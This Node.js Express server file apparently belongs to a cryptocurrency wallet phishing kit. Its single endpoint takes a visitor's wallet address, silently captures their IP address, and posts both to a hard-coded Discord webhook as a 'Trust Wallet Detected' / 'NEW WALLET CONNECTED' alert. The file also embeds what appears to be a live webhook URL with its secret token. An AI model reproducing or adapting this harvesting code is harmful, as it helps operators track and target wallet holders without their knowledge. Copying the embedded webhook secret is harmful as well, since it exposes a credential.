const express = require('express');
const axios = require('axios');
const app = express();

const PORT = process.env.PORT || 3000;

// ⭐⭐⭐ PUT YOUR DISCORD WEBHOOK HERE ⭐⭐⭐
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1459213607219892245/M_dBdrlpBILx4BNIW3mfxfnc7EHPxXNSe9xNArkl4q_3dc6_ejbKy0ojgRJ4yoeozfVp";

app.use(express.static('public'));

// API to send to Discord
app.get('/send-to-discord', async (req, res) => {
    try {
        const wallet = req.query.wallet || 'No wallet';
        const ip = req.ip || req.connection.remoteAddress;
        
        console.log('📢 Got wallet:', wallet);
        
        // Send to Discord
        if (DISCORD_WEBHOOK && wallet !== 'No wallet') {
            const message = {
                content: `🚨 **NEW WALLET CONNECTED** 🚨`,
                embeds: [{
                    title: "Trust Wallet Detected",
                    color: 65280,
                    fields: [
                        { name: "Wallet Address", value: `\`${wallet}\`` },
                        { name: "IP Address", value: `\`${ip}\`` },
                        { name: "Time", value: new Date().toLocaleString() }
                    ]
                }]
            };
            
            await axios.post(DISCORD_WEBHOOK, message);
            console.log('✅ Sent to Discord!');
        }
        
        res.json({ success: true, message: 'Data sent!' });
        
    } catch (error) {
        console.error('❌ Error:', error.message);
        res.json({ success: false, error: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`✅ Server running: http://localhost:${PORT}`);
    console.log(`📢 Webhook: ${DISCORD_WEBHOOK ? 'SET' : 'NOT SET'}`);
});
